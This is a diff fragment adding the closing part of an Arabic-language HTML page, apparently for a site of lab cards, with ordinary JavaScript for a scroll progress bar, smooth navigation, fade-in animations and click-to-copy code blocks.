+                        <i class="fab fa-github"></i> المصدر على GitHub
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    
+    <script>
+        // Progress bar functionality
+        window.addEventListener('scroll', () => {
+            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
+            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            const scrolled = (winScroll / height) * 100;
+            document.getElementById('progressBar').style.width = scrolled + '%';
+        });
+
+        // Smooth scrolling for navigation links
+        document.querySelectorAll('.nav-menu a').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Add animation to lab cards
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, observerOptions);
+
+        // Observe all lab cards and content sections
+        document.querySelectorAll('.lab-card, .content-section').forEach(el => {
+            el.style.opacity = '0';
+            el.style.transform = 'translateY(30px)';
+            el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+            observer.observe(el);
+        });
+
+        // Copy code functionality
+        document.querySelectorAll('.code-block pre').forEach(pre => {
+            pre.addEventListener('click', () => {
+                const text = pre.textContent;
+                navigator.clipboard.writeText(text).then(() => {
+                    // Visual feedback
+                    const original = pre.style.background;
+                    pre.style.background = 'rgba(129, 199, 132, 0.2)';
+                    setTimeout(() => {
+                        pre.style.background = original;
+                    }, 500);
+                });
+            });
+            
+            // Add click hint
+            pre.style.cursor = 'pointer';
+            pre.title = 'اضغط لنسخ الكود';
+        });
+    </script>
+</body>
+</html> 
